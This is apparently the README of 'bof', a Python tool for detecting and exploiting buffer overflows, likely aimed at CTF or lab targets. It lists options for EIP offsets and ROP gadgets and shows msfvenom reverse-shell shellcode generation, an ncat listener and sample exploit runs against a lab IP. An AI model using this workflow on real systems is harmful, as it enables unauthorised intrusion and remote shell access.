# bof

Simple tool to detect and exploit buffer overflows.

<img src="https://raw.githubusercontent.com/sudoaza/bof/main/images/bof.svg" alt="bof Buffer Overflow exploitation script usage" width="960" />

## Usage

usage: bof.py [-h] -H HOST -p PORT -o OFFSET [-e EIP] [-b BIN] [-s SIZE] [-sf SUFFIX] [-pf PREFIX] [-a ARCH] [-O OS]

Exploit buffer overflows.

Options:
- -h, --help            show this help message and exit
- -H HOST, --host HOST  Target host
- -p PORT, --port PORT  Target port
- -o OFFSET, --offset OFFSET EIP offset
- -e EIP, --eip EIP     Value to overwrite EIP with or ROP chain. Ie. 0x01010101,0x02020202,0x03030303
- -b BIN, --bin BIN     Target binary to extract gadgets from. Only ELF!!
- -s SIZE, --size SIZE  Payload size
- -sf SUFFIX, --suffix SUFFIX  Payload suffix, Ie. USER
- -pf PREFIX, --prefix PREFIX Payload prefix, Ie. \n
- -a ARCH, --arch ARCH  Target architecture. Ie. x86 or amd64
- -O OS, --os OS        Target OS. Ie. windows or linux
- -v, --debug           Show debug information


Create custom shellcode and save to shellcode.py
(must be formatted buf = b'\x90\x90\x90\x90...')

    msfvenom -p windows/shell_reverse_tcp ... -f python -a x86 > shellcode.py

Listen for shell

    ncat -lvp 4444


Run by passing the return address to overwrite EIP

    ./bof.py -H 10.10.76.237 -p 31337 --sf $'\n' -o 146 -e '0x080414c3'


Run by passing a binary and search for a JPM ESP ROP automatically


    ./bof.py -H 10.10.76.237 -p 31337 --sf $'\n' -o 146 -b ./vuln

## Install

    git clone git@github.com:sudoaza/bof.git
    cd bof
    pip install -r requirements.txt

